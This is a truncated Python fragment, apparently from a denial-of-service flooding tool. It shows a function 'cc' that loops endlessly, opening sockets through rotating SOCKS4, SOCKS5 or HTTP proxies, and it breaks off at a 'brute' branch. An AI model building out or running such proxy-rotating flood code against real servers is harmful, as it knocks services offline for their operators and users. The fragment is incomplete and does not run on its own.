...
def cc(event,proxy_type):
	...
	while True:
		try:
			s = socketserver.socksocket()
			if proxy_type == 4:
				s.set_proxy(socketserver.SOCKS4, str(proxy[0]), int(proxy[1]))
			if proxy_type == 5:
				s.set_proxy(socketserver.SOCKS5, str(proxy[0]), int(proxy[1]))
			if proxy_type == 0:
				s.set_proxy(socketserver.HTTP, str(proxy[0]), int(proxy[1]))
			if brute:
